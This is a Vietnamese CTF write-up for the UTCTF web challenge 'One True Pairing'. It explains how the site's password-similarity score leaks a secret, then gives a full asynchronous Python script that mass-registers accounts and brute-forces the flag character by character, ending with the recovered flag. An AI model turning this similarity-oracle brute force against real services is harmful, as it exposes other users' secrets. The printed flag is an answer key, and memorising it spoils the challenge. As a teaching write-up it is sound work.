# Description:
```
Find your One True Pairing on this new site I made! Whoever has the closest OTP to the "flag" will get their very own date!

This problem resets every 30 minutes.

By Sasha (@kyrili on discord)

http://challenge.utctf.live:3725
```

# Analyze:

![image](https://github.com/user-attachments/assets/d6805c43-dd75-432c-a34c-f11a2f3d9b17)

Idea của bài này là: Giả sử như chuỗi ta có chuỗi `aaa`, thì với 1 chuỗi là `ax` với x là 1 kí tự nằm trong alphabet và digits, thì x=a sẽ cho kết quả bé nhất, tức nếu so sánh thì `aa` so với `aaa` sẽ bé hơn `ab` so với `aaa` và ... . Đó chính là idea chính của bài, giờ ta chỉ việc bruteforce ra flag thôi. Nếu diff =0 thì flag là chính xác

# Exploit:

Do `_` rất bé nên ta sẽ không vác đi so sánh mà thay vô cho hợp tình hợp lý sau khi kết quả cuối cùng được gen ra

### Script:

```py
import aiohttp
import asyncio
from bs4 import BeautifulSoup
import string
from typing import List, Optional, Tuple

# Configuration
BASE_URL = "http://challenge.utctf.live:3725/index.php"
USERNAME_PREFIX = "kacf"
# PREFIX_PASSWORD = "utflag{On3_sT3P_4t_4_t1m3}"
PREFIX_PASSWORD = "utflag{"
POSTFIX_PASSWORD = "}"  # Hậu tố của password
VALID_CHARS = string.ascii_lowercase + string.digits + "_{}"
NEXT_CHARS = string.ascii_lowercase + string.digits # Chỉ dùng a-z và 0-9 để thử tiếp
MAX_USERNAME_LENGTH = 16
RETRY_COUNT = 3
REQUEST_TIMEOUT = 5
DELAY_BETWEEN_REQUESTS = 0.01

HEADERS = {
    "Host": "challenge.utctf.live:3725",
    "Cache-Control": "max-age=0",
    "Accept-Language": "en-US",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://challenge.utctf.live:3725",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://challenge.utctf.live:3725/index.php",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}

async def send_request(session: aiohttp.ClientSession, data: dict) -> Optional[str]:
    """Gửi POST request bất đồng bộ với retry logic."""
    for attempt in range(RETRY_COUNT):
        try:
            async with session.post(BASE_URL, headers=HEADERS, data=data, timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as response:
                response.raise_for_status()
                return await response.text()
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"❌ Lỗi {data} (Lần {attempt + 1}/{RETRY_COUNT}): {e}")
            if attempt < RETRY_COUNT - 1:
                await asyncio.sleep(2)
    return None

def save_to_file(content: str, filename: str = "results.txt") -> None:
    """Ghi nội dung vào file, dùng context manager để quản lý tài nguyên."""
    with open(filename, "a", encoding="utf-8") as file:
        file.write(f"{content}\n")

async def register_account(session: aiohttp.ClientSession, username: str, password: str) -> bool:
    """Đăng ký một tài khoản bất đồng bộ và thử lại nếu thất bại."""
    if len(username) > MAX_USERNAME_LENGTH:
        print(f"❌ Tên {username} vượt quá độ dài tối đa ({MAX_USERNAME_LENGTH})")
        return False

    for attempt in range(RETRY_COUNT):
        response_text = await send_request(session, {"username": username, "password": password})
        if response_text:
            soup = BeautifulSoup(response_text, "html.parser")
            message = (soup.select_one("body p") or soup).text.strip()
            result = f"Created {username}:{password}: {message}"
            print(f"✔️ {result}")
            save_to_file(result)
            return True
        else:
            print(f"❌ Thử lại {username}:{password} (Lần {attempt + 1}/{RETRY_COUNT})")
            if attempt < RETRY_COUNT - 1:
                await asyncio.sleep(2)
    
    print(f"❌ Không tạo được {username}:{password} sau {RETRY_COUNT} lần thử")
    return False

async def create_accounts(prefix: str, chars: str, current_flag: str) -> List[str]:
    """Tạo danh sách tài khoản bất đồng bộ với prefix, ký tự hợp lệ và password dựa trên flag hiện tại."""
    usernames = []
    async with aiohttp.ClientSession() as session:
        tasks = []
        for char in chars:
            username = prefix + char
            password = f"{PREFIX_PASSWORD}{current_flag}{char}{POSTFIX_PASSWORD}"
            tasks.append(register_account(session, username, password))
        
        results = await asyncio.gather(*tasks)
        for username, success in zip([prefix + char for char in chars], results):
            if success:
                usernames.append(username)
        await asyncio.sleep(DELAY_BETWEEN_REQUESTS)  # Delay sau khi hoàn tất batch
    return usernames

async def check_pairs(first_username: str, other_usernames: List[str]) -> List[Tuple[str, int]]:
    """Kiểm tra điểm ghép đôi bất đồng bộ và trả về danh sách (username, score)."""
    scores = []
    async with aiohttp.ClientSession() as session:
        tasks = []
        for username in other_usernames:
            data = {"username1": first_username, "username2": username}
            tasks.append(send_request(session, data))
        
        responses = await asyncio.gather(*tasks)
        for username, response_text in zip(other_usernames, responses):
            if not response_text:
                print(f"❌ Lỗi khi kiểm tra {first_username} & {username}")
                continue

            soup = BeautifulSoup(response_text, "html.parser")
            result = soup.select_one("body p")
            score_str = result.text.strip().split(":")[1] if result and ":" in result.text else "N/A"
            try:
                score = int(score_str)
                display_result = f"{first_username} & {username} -> {score}"
                save_result = f"Pairing {first_username[len(USERNAME_PREFIX):]} & {username}: {score}"
                print(display_result)
                save_to_file(save_result)
                scores.append((username, score))
            except ValueError:
                print(f"❌ Điểm không hợp lệ cho {first_username} & {username}: {score_str}")
    
    await asyncio.sleep(DELAY_BETWEEN_REQUESTS)  # Delay sau khi hoàn tất batch
    return scores

async def find_flag() -> str:
    """Tìm flag bằng cách lặp lại quá trình ghép đôi với điểm thấp nhất."""
    flag = ""
    current_prefix = USERNAME_PREFIX

    while True:
        print(f"\nTạo tài khoản với prefix: {current_prefix}")
        usernames = await create_accounts(current_prefix, NEXT_CHARS, flag)
        if len(usernames) < 2:
            print("❌ Không đủ tài khoản để ghép đôi.")
            break

        first_username = "flag"
        scores = await check_pairs(first_username, usernames)
        if not scores:
            print("❌ Không có dữ liệu ghép đôi để phân tích.")
            break

        min_score_pair = min(scores, key=lambda x: x[1])
        next_username = min_score_pair[0]
        next_char = next_username[len(current_prefix):]
        score = min_score_pair[1]

        print(f"Điểm thấp nhất: {score} với {next_username}")

        if score == 0:
            print("Điểm 0 đạt được, có thể flag đã hoàn tất.")
            break

        flag += next_char
        current_prefix = next_username
        print(f"Flag hiện tại: {PREFIX_PASSWORD}{flag}{POSTFIX_PASSWORD}")

    return f"{PREFIX_PASSWORD}{flag}{POSTFIX_PASSWORD}"

async def main():
    """Chương trình chính: Tìm flag và gửi lên server."""
    print("Bắt đầu tìm flag...")
    final_flag = await find_flag()
    
    if final_flag:
        print(f"🎯 Flag cuối cùng: {final_flag}")
        save_to_file(f"Final flag: {final_flag}")
    print("Hoàn tất!")

if __name__ == "__main__":
    asyncio.run(main())
```

Do bài còn là case-sensitive, nên ta phải thử viết hoa từng chữ 1 nữa. Cuối cùng, những chữ cần viết hoa là O, T, P

# Flag:
utflag{On3_sT3P_4t_4_t1m3}
